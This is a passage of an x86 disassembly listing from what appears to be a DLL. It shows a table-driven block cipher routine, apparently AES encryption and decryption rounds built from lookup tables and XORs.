1000923e:	c1 e7 08             	shl    $0x8,%edi
10009241:	0b fb                	or     %ebx,%edi
10009243:	0f b6 58 09          	movzbl 0x9(%eax),%ebx
10009247:	c1 e7 08             	shl    $0x8,%edi
1000924a:	0b fb                	or     %ebx,%edi
1000924c:	0f b6 58 08          	movzbl 0x8(%eax),%ebx
10009250:	c1 e7 08             	shl    $0x8,%edi
10009253:	0b fb                	or     %ebx,%edi
10009255:	33 79 08             	xor    0x8(%ecx),%edi
10009258:	0f b6 58 0e          	movzbl 0xe(%eax),%ebx
1000925c:	33 31                	xor    (%ecx),%esi
1000925e:	33 51 04             	xor    0x4(%ecx),%edx
10009261:	89 7d fc             	mov    %edi,-0x4(%ebp)
10009264:	0f b6 78 0f          	movzbl 0xf(%eax),%edi
10009268:	c1 e7 08             	shl    $0x8,%edi
1000926b:	0b fb                	or     %ebx,%edi
1000926d:	0f b6 58 0d          	movzbl 0xd(%eax),%ebx
10009271:	0f b6 40 0c          	movzbl 0xc(%eax),%eax
10009275:	c1 e7 08             	shl    $0x8,%edi
10009278:	0b fb                	or     %ebx,%edi
1000927a:	c1 e7 08             	shl    $0x8,%edi
1000927d:	0b f8                	or     %eax,%edi
1000927f:	33 79 0c             	xor    0xc(%ecx),%edi
10009282:	8b 45 08             	mov    0x8(%ebp),%eax
10009285:	83 c1 10             	add    $0x10,%ecx
10009288:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
1000928c:	89 7d f8             	mov    %edi,-0x8(%ebp)
1000928f:	0f 85 fb 03 00 00    	jne    0x10009690
10009295:	8b 18                	mov    (%eax),%ebx
10009297:	d1 fb                	sar    %ebx
10009299:	4b                   	dec    %ebx
1000929a:	89 5d f4             	mov    %ebx,-0xc(%ebp)
1000929d:	b8 ff 00 00 00       	mov    $0xff,%eax
100092a2:	85 db                	test   %ebx,%ebx
100092a4:	0f 8e e2 01 00 00    	jle    0x1000948c
100092aa:	8b 5d fc             	mov    -0x4(%ebp),%ebx
100092ad:	c1 eb 10             	shr    $0x10,%ebx
100092b0:	23 d8                	and    %eax,%ebx
100092b2:	c1 ef 08             	shr    $0x8,%edi
100092b5:	23 f8                	and    %eax,%edi
100092b7:	8b 3c bd 48 19 01 10 	mov    0x10011948(,%edi,4),%edi
100092be:	33 3c 9d 20 15 01 10 	xor    0x10011520(,%ebx,4),%edi
100092c5:	8b da                	mov    %edx,%ebx
100092c7:	c1 eb 18             	shr    $0x18,%ebx
100092ca:	33 3c 9d 20 11 01 10 	xor    0x10011120(,%ebx,4),%edi
100092d1:	8b de                	mov    %esi,%ebx
100092d3:	23 d8                	and    %eax,%ebx
100092d5:	33 3c 9d 48 1d 01 10 	xor    0x10011d48(,%ebx,4),%edi
100092dc:	8b de                	mov    %esi,%ebx
100092de:	33 39                	xor    (%ecx),%edi
100092e0:	c1 eb 08             	shr    $0x8,%ebx
100092e3:	89 7d 0c             	mov    %edi,0xc(%ebp)
100092e6:	8b 7d f8             	mov    -0x8(%ebp),%edi
100092e9:	23 d8                	and    %eax,%ebx
100092eb:	c1 ef 10             	shr    $0x10,%edi
100092ee:	23 f8                	and    %eax,%edi
100092f0:	8b 3c bd 20 15 01 10 	mov    0x10011520(,%edi,4),%edi
100092f7:	33 3c 9d 48 19 01 10 	xor    0x10011948(,%ebx,4),%edi
100092fe:	8b 5d fc             	mov    -0x4(%ebp),%ebx
10009301:	c1 eb 18             	shr    $0x18,%ebx
10009304:	33 3c 9d 20 11 01 10 	xor    0x10011120(,%ebx,4),%edi
1000930b:	8b da                	mov    %edx,%ebx
1000930d:	23 d8                	and    %eax,%ebx
1000930f:	33 3c 9d 48 1d 01 10 	xor    0x10011d48(,%ebx,4),%edi
10009316:	8b de                	mov    %esi,%ebx
10009318:	33 79 04             	xor    0x4(%ecx),%edi
1000931b:	c1 eb 10             	shr    $0x10,%ebx
1000931e:	23 d8                	and    %eax,%ebx
10009320:	89 7d 08             	mov    %edi,0x8(%ebp)
10009323:	8b fa                	mov    %edx,%edi
10009325:	c1 ef 08             	shr    $0x8,%edi
10009328:	23 f8                	and    %eax,%edi
1000932a:	8b 3c bd 48 19 01 10 	mov    0x10011948(,%edi,4),%edi
10009331:	33 3c 9d 20 15 01 10 	xor    0x10011520(,%ebx,4),%edi
10009338:	8b 5d f8             	mov    -0x8(%ebp),%ebx
1000933b:	c1 eb 18             	shr    $0x18,%ebx
1000933e:	33 3c 9d 20 11 01 10 	xor    0x10011120(,%ebx,4),%edi
10009345:	8b 5d fc             	mov    -0x4(%ebp),%ebx
10009348:	23 d8                	and    %eax,%ebx
1000934a:	33 3c 9d 48 1d 01 10 	xor    0x10011d48(,%ebx,4),%edi
10009351:	8b 5d fc             	mov    -0x4(%ebp),%ebx
10009354:	33 79 08             	xor    0x8(%ecx),%edi
10009357:	c1 eb 08             	shr    $0x8,%ebx
1000935a:	23 d8                	and    %eax,%ebx
1000935c:	c1 ea 10             	shr    $0x10,%edx
1000935f:	23 d0                	and    %eax,%edx
10009361:	89 55 fc             	mov    %edx,-0x4(%ebp)
10009364:	8b 14 9d 48 19 01 10 	mov    0x10011948(,%ebx,4),%edx
1000936b:	8b 5d fc             	mov    -0x4(%ebp),%ebx
1000936e:	33 14 9d 20 15 01 10 	xor    0x10011520(,%ebx,4),%edx
10009375:	c1 ee 18             	shr    $0x18,%esi
10009378:	33 14 b5 20 11 01 10 	xor    0x10011120(,%esi,4),%edx
1000937f:	8b 75 f8             	mov    -0x8(%ebp),%esi
10009382:	23 f0                	and    %eax,%esi
10009384:	33 14 b5 48 1d 01 10 	xor    0x10011d48(,%esi,4),%edx
1000938b:	8b df                	mov    %edi,%ebx
1000938d:	33 51 0c             	xor    0xc(%ecx),%edx
10009390:	c1 eb 10             	shr    $0x10,%ebx
10009393:	8b f2                	mov    %edx,%esi
10009395:	c1 ee 08             	shr    $0x8,%esi
10009398:	23 f0                	and    %eax,%esi
1000939a:	8b 34 b5 48 19 01 10 	mov    0x10011948(,%esi,4),%esi
100093a1:	23 d8                	and    %eax,%ebx
100093a3:	33 34 9d 20 15 01 10 	xor    0x10011520(,%ebx,4),%esi
100093aa:	8b 5d 08             	mov    0x8(%ebp),%ebx
100093ad:	c1 eb 18             	shr    $0x18,%ebx
100093b0:	33 34 9d 20 11 01 10 	xor    0x10011120(,%ebx,4),%esi
100093b7:	8b 5d 0c             	mov    0xc(%ebp),%ebx
100093ba:	23 d8                	and    %eax,%ebx
100093bc:	33 34 9d 48 1d 01 10 	xor    0x10011d48(,%ebx,4),%esi
100093c3:	8b 5d 0c             	mov    0xc(%ebp),%ebx
100093c6:	33 71 10             	xor    0x10(%ecx),%esi
100093c9:	89 55 f8             	mov    %edx,-0x8(%ebp)
100093cc:	c1 ea 10             	shr    $0x10,%edx
100093cf:	89 7d f0             	mov    %edi,-0x10(%ebp)
100093d2:	23 d0                	and    %eax,%edx
100093d4:	8b 14 95 20 15 01 10 	mov    0x10011520(,%edx,4),%edx
100093db:	c1 eb 08             	shr    $0x8,%ebx
100093de:	23 d8                	and    %eax,%ebx
100093e0:	33 14 9d 48 19 01 10 	xor    0x10011948(,%ebx,4),%edx
100093e7:	8b 5d 0c             	mov    0xc(%ebp),%ebx
100093ea:	c1 ef 18             	shr    $0x18,%edi
100093ed:	33 14 bd 20 11 01 10 	xor    0x10011120(,%edi,4),%edx
100093f4:	8b 7d 08             	mov    0x8(%ebp),%edi
100093f7:	23 f8                	and    %eax,%edi
100093f9:	33 14 bd 48 1d 01 10 	xor    0x10011d48(,%edi,4),%edx
10009400:	8b 7d 08             	mov    0x8(%ebp),%edi
10009403:	c1 ef 08             	shr    $0x8,%edi
10009406:	23 f8                	and    %eax,%edi
10009408:	8b 3c bd 48 19 01 10 	mov    0x10011948(,%edi,4),%edi
1000940f:	c1 eb 10             	shr    $0x10,%ebx
10009412:	23 d8                	and    %eax,%ebx
10009414:	33 3c 9d 20 15 01 10 	xor    0x10011520(,%ebx,4),%edi
1000941b:	8b 5d f8             	mov    -0x8(%ebp),%ebx
1000941e:	c1 eb 18             	shr    $0x18,%ebx
10009421:	33 3c 9d 20 11 01 10 	xor    0x10011120(,%ebx,4),%edi
10009428:	8b 5d f0             	mov    -0x10(%ebp),%ebx
1000942b:	23 d8                	and    %eax,%ebx
1000942d:	33 3c 9d 48 1d 01 10 	xor    0x10011d48(,%ebx,4),%edi
10009434:	8b 5d f0             	mov    -0x10(%ebp),%ebx
10009437:	33 79 18             	xor    0x18(%ecx),%edi
1000943a:	33 51 14             	xor    0x14(%ecx),%edx
1000943d:	89 7d fc             	mov    %edi,-0x4(%ebp)
10009440:	8b 7d 08             	mov    0x8(%ebp),%edi
10009443:	c1 eb 08             	shr    $0x8,%ebx
10009446:	c1 ef 10             	shr    $0x10,%edi
10009449:	23 d8                	and    %eax,%ebx
1000944b:	8b 1c 9d 48 19 01 10 	mov    0x10011948(,%ebx,4),%ebx
10009452:	23 f8                	and    %eax,%edi
10009454:	33 1c bd 20 15 01 10 	xor    0x10011520(,%edi,4),%ebx
1000945b:	8b 7d 0c             	mov    0xc(%ebp),%edi
1000945e:	c1 ef 18             	shr    $0x18,%edi
10009461:	33 1c bd 20 11 01 10 	xor    0x10011120(,%edi,4),%ebx
10009468:	8b 7d f8             	mov    -0x8(%ebp),%edi
1000946b:	23 f8                	and    %eax,%edi
1000946d:	33 1c bd 48 1d 01 10 	xor    0x10011d48(,%edi,4),%ebx
10009474:	83 c1 20             	add    $0x20,%ecx
10009477:	33 59 fc             	xor    -0x4(%ecx),%ebx
1000947a:	ff 4d f4             	decl   -0xc(%ebp)
1000947d:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
10009481:	8b fb                	mov    %ebx,%edi
10009483:	89 7d f8             	mov    %edi,-0x8(%ebp)
10009486:	0f 8f 1e fe ff ff    	jg     0x100092aa
1000948c:	8b 5d fc             	mov    -0x4(%ebp),%ebx
1000948f:	c1 eb 10             	shr    $0x10,%ebx
10009492:	23 d8                	and    %eax,%ebx
10009494:	c1 ef 08             	shr    $0x8,%edi
10009497:	23 f8                	and    %eax,%edi
10009499:	8b 3c bd 48 19 01 10 	mov    0x10011948(,%edi,4),%edi
100094a0:	33 3c 9d 20 15 01 10 	xor    0x10011520(,%ebx,4),%edi
100094a7:	8b da                	mov    %edx,%ebx
100094a9:	c1 eb 18             	shr    $0x18,%ebx
100094ac:	33 3c 9d 20 11 01 10 	xor    0x10011120(,%ebx,4),%edi
100094b3:	8b de                	mov    %esi,%ebx
100094b5:	23 d8                	and    %eax,%ebx
100094b7:	33 3c 9d 48 1d 01 10 	xor    0x10011d48(,%ebx,4),%edi
100094be:	8b de                	mov    %esi,%ebx
100094c0:	33 39                	xor    (%ecx),%edi
100094c2:	c1 eb 08             	shr    $0x8,%ebx
100094c5:	89 7d 0c             	mov    %edi,0xc(%ebp)
100094c8:	8b 7d f8             	mov    -0x8(%ebp),%edi
100094cb:	23 d8                	and    %eax,%ebx
100094cd:	c1 ef 10             	shr    $0x10,%edi
100094d0:	23 f8                	and    %eax,%edi
100094d2:	8b 3c bd 20 15 01 10 	mov    0x10011520(,%edi,4),%edi
100094d9:	33 3c 9d 48 19 01 10 	xor    0x10011948(,%ebx,4),%edi
100094e0:	8b 5d fc             	mov    -0x4(%ebp),%ebx
100094e3:	c1 eb 18             	shr    $0x18,%ebx
100094e6:	33 3c 9d 20 11 01 10 	xor    0x10011120(,%ebx,4),%edi
100094ed:	8b da                	mov    %edx,%ebx
100094ef:	23 d8                	and    %eax,%ebx
100094f1:	33 3c 9d 48 1d 01 10 	xor    0x10011d48(,%ebx,4),%edi
100094f8:	8b de                	mov    %esi,%ebx
100094fa:	33 79 04             	xor    0x4(%ecx),%edi
100094fd:	c1 eb 10             	shr    $0x10,%ebx
10009500:	89 7d 08             	mov    %edi,0x8(%ebp)
10009503:	8b fa                	mov    %edx,%edi
10009505:	23 d8                	and    %eax,%ebx
10009507:	c1 ef 08             	shr    $0x8,%edi
1000950a:	23 f8                	and    %eax,%edi
1000950c:	8b 3c bd 48 19 01 10 	mov    0x10011948(,%edi,4),%edi
10009513:	33 3c 9d 20 15 01 10 	xor    0x10011520(,%ebx,4),%edi
1000951a:	8b 5d f8             	mov    -0x8(%ebp),%ebx
1000951d:	c1 eb 18             	shr    $0x18,%ebx
10009520:	33 3c 9d 20 11 01 10 	xor    0x10011120(,%ebx,4),%edi
10009527:	8b 5d fc             	mov    -0x4(%ebp),%ebx
1000952a:	c1 ea 10             	shr    $0x10,%edx
1000952d:	23 d8                	and    %eax,%ebx
1000952f:	33 3c 9d 48 1d 01 10 	xor    0x10011d48(,%ebx,4),%edi
10009536:	8b 5d fc             	mov    -0x4(%ebp),%ebx
10009539:	33 79 08             	xor    0x8(%ecx),%edi
1000953c:	23 d0                	and    %eax,%edx
1000953e:	c1 eb 08             	shr    $0x8,%ebx
10009541:	23 d8                	and    %eax,%ebx
10009543:	8b 1c 9d 48 19 01 10 	mov    0x10011948(,%ebx,4),%ebx
1000954a:	33 1c 95 20 15 01 10 	xor    0x10011520(,%edx,4),%ebx
10009551:	8b 55 f8             	mov    -0x8(%ebp),%edx
10009554:	23 d0                	and    %eax,%edx
10009556:	c1 ee 18             	shr    $0x18,%esi
10009559:	33 1c b5 20 11 01 10 	xor    0x10011120(,%esi,4),%ebx
10009560:	33 1c 95 48 1d 01 10 	xor    0x10011d48(,%edx,4),%ebx
10009567:	8b d7                	mov    %edi,%edx
10009569:	33 59 0c             	xor    0xc(%ecx),%ebx
1000956c:	c1 ea 10             	shr    $0x10,%edx
1000956f:	23 d0                	and    %eax,%edx
10009571:	0f b6 b2 48 31 01 10 	movzbl 0x10013148(%edx),%esi
10009578:	8b 55 08             	mov    0x8(%ebp),%edx
1000957b:	c1 ea 18             	shr    $0x18,%edx
1000957e:	0f b6 92 48 31 01 10 	movzbl 0x10013148(%edx),%edx
10009585:	c1 e2 08             	shl    $0x8,%edx
10009588:	33 f2                	xor    %edx,%esi
1000958a:	8b d3                	mov    %ebx,%edx
1000958c:	c1 ea 08             	shr    $0x8,%edx
1000958f:	23 d0                	and    %eax,%edx
10009591:	0f b6 92 48 31 01 10 	movzbl 0x10013148(%edx),%edx
10009598:	c1 e6 08             	shl    $0x8,%esi
1000959b:	33 f2                	xor    %edx,%esi
1000959d:	8b 55 0c             	mov    0xc(%ebp),%edx
100095a0:	23 d0                	and    %eax,%edx
100095a2:	0f b6 92 48 31 01 10 	movzbl 0x10013148(%edx),%edx
100095a9:	c1 e6 08             	shl    $0x8,%esi
100095ac:	33 f2                	xor    %edx,%esi
100095ae:	33 71 10             	xor    0x10(%ecx),%esi
100095b1:	89 75 f0             	mov    %esi,-0x10(%ebp)
100095b4:	8b d3                	mov    %ebx,%edx
100095b6:	c1 ea 10             	shr    $0x10,%edx
100095b9:	23 d0                	and    %eax,%edx
100095bb:	0f b6 b2 48 31 01 10 	movzbl 0x10013148(%edx),%esi
100095c2:	8b d7                	mov    %edi,%edx
100095c4:	c1 ea 18             	shr    $0x18,%edx
100095c7:	0f b6 92 48 31 01 10 	movzbl 0x10013148(%edx),%edx
100095ce:	c1 e2 08             	shl    $0x8,%edx
100095d1:	33 f2                	xor    %edx,%esi
100095d3:	8b 55 0c             	mov    0xc(%ebp),%edx
100095d6:	c1 ea 08             	shr    $0x8,%edx
100095d9:	23 d0                	and    %eax,%edx
100095db:	0f b6 92 48 31 01 10 	movzbl 0x10013148(%edx),%edx
100095e2:	c1 e6 08             	shl    $0x8,%esi
100095e5:	33 f2                	xor    %edx,%esi
100095e7:	8b 55 08             	mov    0x8(%ebp),%edx
100095ea:	23 d0                	and    %eax,%edx
100095ec:	0f b6 92 48 31 01 10 	movzbl 0x10013148(%edx),%edx
100095f3:	c1 e6 08             	shl    $0x8,%esi
100095f6:	33 f2                	xor    %edx,%esi
100095f8:	33 71 14             	xor    0x14(%ecx),%esi
100095fb:	8b 55 0c             	mov    0xc(%ebp),%edx
100095fe:	c1 ea 10             	shr    $0x10,%edx
10009601:	23 d0                	and    %eax,%edx
10009603:	89 75 f4             	mov    %esi,-0xc(%ebp)
10009606:	0f b6 b2 48 31 01 10 	movzbl 0x10013148(%edx),%esi
1000960d:	8b d3                	mov    %ebx,%edx
1000960f:	c1 ea 18             	shr    $0x18,%edx
10009612:	0f b6 92 48 31 01 10 	movzbl 0x10013148(%edx),%edx
10009619:	c1 e2 08             	shl    $0x8,%edx
1000961c:	33 f2                	xor    %edx,%esi
1000961e:	8b 55 08             	mov    0x8(%ebp),%edx
10009621:	c1 ea 08             	shr    $0x8,%edx
10009624:	23 d0                	and    %eax,%edx
10009626:	0f b6 92 48 31 01 10 	movzbl 0x10013148(%edx),%edx
1000962d:	c1 e6 08             	shl    $0x8,%esi
10009630:	33 f2                	xor    %edx,%esi
10009632:	8b d7                	mov    %edi,%edx
10009634:	23 d0                	and    %eax,%edx
10009636:	0f b6 92 48 31 01 10 	movzbl 0x10013148(%edx),%edx
1000963d:	c1 e6 08             	shl    $0x8,%esi
10009640:	33 f2                	xor    %edx,%esi
10009642:	33 71 18             	xor    0x18(%ecx),%esi
10009645:	8b 55 08             	mov    0x8(%ebp),%edx
10009648:	89 75 fc             	mov    %esi,-0x4(%ebp)
1000964b:	8b 75 0c             	mov    0xc(%ebp),%esi
1000964e:	c1 ea 10             	shr    $0x10,%edx
10009651:	23 d0                	and    %eax,%edx
10009653:	0f b6 92 48 31 01 10 	movzbl 0x10013148(%edx),%edx
1000965a:	c1 ee 18             	shr    $0x18,%esi
1000965d:	0f b6 b6 48 31 01 10 	movzbl 0x10013148(%esi),%esi
10009664:	c1 e6 08             	shl    $0x8,%esi
10009667:	33 d6                	xor    %esi,%edx
10009669:	c1 ef 08             	shr    $0x8,%edi
1000966c:	23 f8                	and    %eax,%edi
1000966e:	0f b6 b7 48 31 01 10 	movzbl 0x10013148(%edi),%esi
10009675:	c1 e2 08             	shl    $0x8,%edx
10009678:	23 d8                	and    %eax,%ebx
1000967a:	0f b6 83 48 31 01 10 	movzbl 0x10013148(%ebx),%eax
10009681:	33 d6                	xor    %esi,%edx
10009683:	c1 e2 08             	shl    $0x8,%edx
10009686:	33 d0                	xor    %eax,%edx
10009688:	33 51 1c             	xor    0x1c(%ecx),%edx
1000968b:	e9 00 04 00 00       	jmp    0x10009a90
10009690:	8b 38                	mov    (%eax),%edi
10009692:	d1 ff                	sar    %edi
10009694:	4f                   	dec    %edi
10009695:	89 7d f4             	mov    %edi,-0xc(%ebp)
10009698:	b8 ff 00 00 00       	mov    $0xff,%eax
1000969d:	85 ff                	test   %edi,%edi
1000969f:	0f 8e e4 01 00 00    	jle    0x10009889
100096a5:	8b 7d fc             	mov    -0x4(%ebp),%edi
100096a8:	c1 ef 10             	shr    $0x10,%edi
100096ab:	23 f8                	and    %eax,%edi
100096ad:	8b 3c bd 48 25 01 10 	mov    0x10012548(,%edi,4),%edi
100096b4:	8b da                	mov    %edx,%ebx
100096b6:	c1 eb 08             	shr    $0x8,%ebx
100096b9:	23 d8                	and    %eax,%ebx
100096bb:	33 3c 9d 48 29 01 10 	xor    0x10012948(,%ebx,4),%edi
100096c2:	8b 5d f8             	mov    -0x8(%ebp),%ebx
100096c5:	c1 eb 18             	shr    $0x18,%ebx
100096c8:	33 3c 9d 48 21 01 10 	xor    0x10012148(,%ebx,4),%edi
100096cf:	8b de                	mov    %esi,%ebx
100096d1:	23 d8                	and    %eax,%ebx
100096d3:	33 3c 9d 48 2d 01 10 	xor    0x10012d48(,%ebx,4),%edi
100096da:	8b 5d fc             	mov    -0x4(%ebp),%ebx
100096dd:	33 39                	xor    (%ecx),%edi
100096df:	c1 eb 08             	shr    $0x8,%ebx
100096e2:	89 7d 0c             	mov    %edi,0xc(%ebp)
100096e5:	8b 7d f8             	mov    -0x8(%ebp),%edi
100096e8:	c1 ef 10             	shr    $0x10,%edi
100096eb:	23 f8                	and    %eax,%edi
100096ed:	8b 3c bd 48 25 01 10 	mov    0x10012548(,%edi,4),%edi
100096f4:	23 d8                	and    %eax,%ebx
100096f6:	33 3c 9d 48 29 01 10 	xor    0x10012948(,%ebx,4),%edi
100096fd:	8b de                	mov    %esi,%ebx
100096ff:	c1 eb 18             	shr    $0x18,%ebx
10009702:	33 3c 9d 48 21 01 10 	xor    0x10012148(,%ebx,4),%edi
10009709:	8b da                	mov    %edx,%ebx
1000970b:	23 d8                	and    %eax,%ebx
1000970d:	33 3c 9d 48 2d 01 10 	xor    0x10012d48(,%ebx,4),%edi
10009714:	8b de                	mov    %esi,%ebx
10009716:	33 79 04             	xor    0x4(%ecx),%edi
10009719:	c1 eb 10             	shr    $0x10,%ebx
1000971c:	89 7d 08             	mov    %edi,0x8(%ebp)
1000971f:	8b 7d f8             	mov    -0x8(%ebp),%edi
10009722:	c1 ef 08             	shr    $0x8,%edi
10009725:	23 f8                	and    %eax,%edi
10009727:	23 d8                	and    %eax,%ebx
10009729:	89 5d f0             	mov    %ebx,-0x10(%ebp)
1000972c:	8b 1c bd 48 29 01 10 	mov    0x10012948(,%edi,4),%ebx
10009733:	8b 7d f0             	mov    -0x10(%ebp),%edi
10009736:	33 1c bd 48 25 01 10 	xor    0x10012548(,%edi,4),%ebx
1000973d:	8b fa                	mov    %edx,%edi
1000973f:	c1 ea 10             	shr    $0x10,%edx
10009742:	c1 ef 18             	shr    $0x18,%edi
10009745:	33 1c bd 48 21 01 10 	xor    0x10012148(,%edi,4),%ebx
1000974c:	8b 7d fc             	mov    -0x4(%ebp),%edi
1000974f:	23 d0                	and    %eax,%edx
10009751:	c1 ee 08             	shr    $0x8,%esi
10009754:	23 f8                	and    %eax,%edi
10009756:	33 1c bd 48 2d 01 10 	xor    0x10012d48(,%edi,4),%ebx
1000975d:	8b 3c 95 48 25 01 10 	mov    0x10012548(,%edx,4),%edi
10009764:	8b 55 fc             	mov    -0x4(%ebp),%edx
10009767:	33 59 08             	xor    0x8(%ecx),%ebx
1000976a:	23 f0                	and    %eax,%esi
1000976c:	33 3c b5 48 29 01 10 	xor    0x10012948(,%esi,4),%edi
10009773:	8b 75 08             	mov    0x8(%ebp),%esi
10009776:	c1 ea 18             	shr    $0x18,%edx
10009779:	33 3c 95 48 21 01 10 	xor    0x10012148(,%edx,4),%edi
10009780:	8b 55 f8             	mov    -0x8(%ebp),%edx
10009783:	23 d0                	and    %eax,%edx
10009785:	33 3c 95 48 2d 01 10 	xor    0x10012d48(,%edx,4),%edi
1000978c:	c1 ee 08             	shr    $0x8,%esi
1000978f:	33 79 0c             	xor    0xc(%ecx),%edi
10009792:	8b d3                	mov    %ebx,%edx
10009794:	c1 ea 10             	shr    $0x10,%edx
10009797:	23 d0                	and    %eax,%edx
10009799:	8b 14 95 48 25 01 10 	mov    0x10012548(,%edx,4),%edx
100097a0:	23 f0                	and    %eax,%esi
100097a2:	33 14 b5 48 29 01 10 	xor    0x10012948(,%esi,4),%edx
100097a9:	8b f7                	mov    %edi,%esi
100097ab:	c1 ee 18             	shr    $0x18,%esi
100097ae:	33 14 b5 48 21 01 10 	xor    0x10012148(,%esi,4),%edx
100097b5:	8b 75 0c             	mov    0xc(%ebp),%esi
100097b8:	23 f0                	and    %eax,%esi
100097ba:	33 14 b5 48 2d 01 10 	xor    0x10012d48(,%esi,4),%edx
100097c1:	89 5d f0             	mov    %ebx,-0x10(%ebp)
100097c4:	33 51 10             	xor    0x10(%ecx),%edx
100097c7:	89 7d f8             	mov    %edi,-0x8(%ebp)
100097ca:	8b f2                	mov    %edx,%esi
100097cc:	8b d7                	mov    %edi,%edx
100097ce:	c1 eb 08             	shr    $0x8,%ebx
100097d1:	23 d8                	and    %eax,%ebx
100097d3:	c1 ea 10             	shr    $0x10,%edx
100097d6:	23 d0                	and    %eax,%edx
100097d8:	8b 14 95 48 25 01 10 	mov    0x10012548(,%edx,4),%edx
100097df:	33 14 9d 48 29 01 10 	xor    0x10012948(,%ebx,4),%edx
100097e6:	8b 5d 0c             	mov    0xc(%ebp),%ebx
100097e9:	c1 eb 18             	shr    $0x18,%ebx
100097ec:	33 14 9d 48 21 01 10 	xor    0x10012148(,%ebx,4),%edx
100097f3:	8b 5d 08             	mov    0x8(%ebp),%ebx
100097f6:	23 d8                	and    %eax,%ebx
100097f8:	33 14 9d 48 2d 01 10 	xor    0x10012d48(,%ebx,4),%edx
100097ff:	8b 5d 0c             	mov    0xc(%ebp),%ebx
10009802:	c1 ef 08             	shr    $0x8,%edi
10009805:	c1 eb 10             	shr    $0x10,%ebx
10009808:	23 f8                	and    %eax,%edi
1000980a:	8b 3c bd 48 29 01 10 	mov    0x10012948(,%edi,4),%edi
10009811:	23 d8                	and    %eax,%ebx
10009813:	33 3c 9d 48 25 01 10 	xor    0x10012548(,%ebx,4),%edi
1000981a:	8b 5d 08             	mov    0x8(%ebp),%ebx
1000981d:	c1 eb 18             	shr    $0x18,%ebx
10009820:	33 3c 9d 48 21 01 10 	xor    0x10012148(,%ebx,4),%edi
10009827:	8b 5d f0             	mov    -0x10(%ebp),%ebx
1000982a:	23 d8                	and    %eax,%ebx
1000982c:	33 3c 9d 48 2d 01 10 	xor    0x10012d48(,%ebx,4),%edi
10009833:	8b 5d 08             	mov    0x8(%ebp),%ebx
10009836:	33 79 18             	xor    0x18(%ecx),%edi
10009839:	33 51 14             	xor    0x14(%ecx),%edx
1000983c:	89 7d fc             	mov    %edi,-0x4(%ebp)
1000983f:	8b 7d 0c             	mov    0xc(%ebp),%edi
10009842:	c1 eb 10             	shr    $0x10,%ebx
10009845:	23 d8                	and    %eax,%ebx
10009847:	8b 1c 9d 48 25 01 10 	mov    0x10012548(,%ebx,4),%ebx
1000984e:	c1 ef 08             	shr    $0x8,%edi
10009851:	23 f8                	and    %eax,%edi
10009853:	33 1c bd 48 29 01 10 	xor    0x10012948(,%edi,4),%ebx
1000985a:	8b 7d f0             	mov    -0x10(%ebp),%edi
1000985d:	c1 ef 18             	shr    $0x18,%edi
10009860:	33 1c bd 48 21 01 10 	xor    0x10012148(,%edi,4),%ebx
10009867:	8b 7d f8             	mov    -0x8(%ebp),%edi
1000986a:	23 f8                	and    %eax,%edi
1000986c:	33 1c bd 48 2d 01 10 	xor    0x10012d48(,%edi,4),%ebx
10009873:	83 c1 20             	add    $0x20,%ecx
10009876:	33 59 fc             	xor    -0x4(%ecx),%ebx
10009879:	ff 4d f4             	decl   -0xc(%ebp)
1000987c:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
10009880:	89 5d f8             	mov    %ebx,-0x8(%ebp)
10009883:	0f 8f 1c fe ff ff    	jg     0x100096a5
10009889:	8b 7d fc             	mov    -0x4(%ebp),%edi
1000988c:	c1 ef 10             	shr    $0x10,%edi
1000988f:	23 f8                	and    %eax,%edi
10009891:	8b 3c bd 48 25 01 10 	mov    0x10012548(,%edi,4),%edi
10009898:	8b da                	mov    %edx,%ebx
1000989a:	c1 eb 08             	shr    $0x8,%ebx
1000989d:	23 d8                	and    %eax,%ebx
1000989f:	33 3c 9d 48 29 01 10 	xor    0x10012948(,%ebx,4),%edi
100098a6:	8b 5d f8             	mov    -0x8(%ebp),%ebx
100098a9:	c1 eb 18             	shr    $0x18,%ebx
100098ac:	33 3c 9d 48 21 01 10 	xor    0x10012148(,%ebx,4),%edi
100098b3:	8b de                	mov    %esi,%ebx
100098b5:	23 d8                	and    %eax,%ebx
100098b7:	33 3c 9d 48 2d 01 10 	xor    0x10012d48(,%ebx,4),%edi
100098be:	8b 5d fc             	mov    -0x4(%ebp),%ebx
100098c1:	33 39                	xor    (%ecx),%edi
100098c3:	c1 eb 08             	shr    $0x8,%ebx
100098c6:	89 7d 0c             	mov    %edi,0xc(%ebp)
100098c9:	8b 7d f8             	mov    -0x8(%ebp),%edi
100098cc:	23 d8                	and    %eax,%ebx
100098ce:	c1 ef 10             	shr    $0x10,%edi
100098d1:	23 f8                	and    %eax,%edi
100098d3:	8b 3c bd 48 25 01 10 	mov    0x10012548(,%edi,4),%edi
100098da:	33 3c 9d 48 29 01 10 	xor    0x10012948(,%ebx,4),%edi
100098e1:	8b de                	mov    %esi,%ebx
100098e3:	c1 eb 18             	shr    $0x18,%ebx
100098e6:	33 3c 9d 48 21 01 10 	xor    0x10012148(,%ebx,4),%edi
100098ed:	8b da                	mov    %edx,%ebx
100098ef:	23 d8                	and    %eax,%ebx
100098f1:	33 3c 9d 48 2d 01 10 	xor    0x10012d48(,%ebx,4),%edi
100098f8:	8b de                	mov    %esi,%ebx
100098fa:	33 79 04             	xor    0x4(%ecx),%edi
100098fd:	c1 eb 10             	shr    $0x10,%ebx
10009900:	23 d8                	and    %eax,%ebx
10009902:	89 7d 08             	mov    %edi,0x8(%ebp)
10009905:	8b 7d f8             	mov    -0x8(%ebp),%edi
10009908:	c1 ef 08             	shr    $0x8,%edi
1000990b:	c1 ee 08             	shr    $0x8,%esi
1000990e:	23 f8                	and    %eax,%edi
10009910:	8b 3c bd 48 29 01 10 	mov    0x10012948(,%edi,4),%edi
10009917:	33 3c 9d 48 25 01 10 	xor    0x10012548(,%ebx,4),%edi
1000991e:	23 f0                	and    %eax,%esi
10009920:	8b da                	mov    %edx,%ebx
10009922:	c1 ea 10             	shr    $0x10,%edx
10009925:	c1 eb 18             	shr    $0x18,%ebx
10009928:	33 3c 9d 48 21 01 10 	xor    0x10012148(,%ebx,4),%edi
1000992f:	8b 5d fc             	mov    -0x4(%ebp),%ebx
10009932:	23 d0                	and    %eax,%edx
10009934:	8b 14 95 48 25 01 10 	mov    0x10012548(,%edx,4),%edx
1000993b:	33 14 b5 48 29 01 10 	xor    0x10012948(,%esi,4),%edx
10009942:	8b 75 fc             	mov    -0x4(%ebp),%esi
10009945:	c1 ee 18             	shr    $0x18,%esi
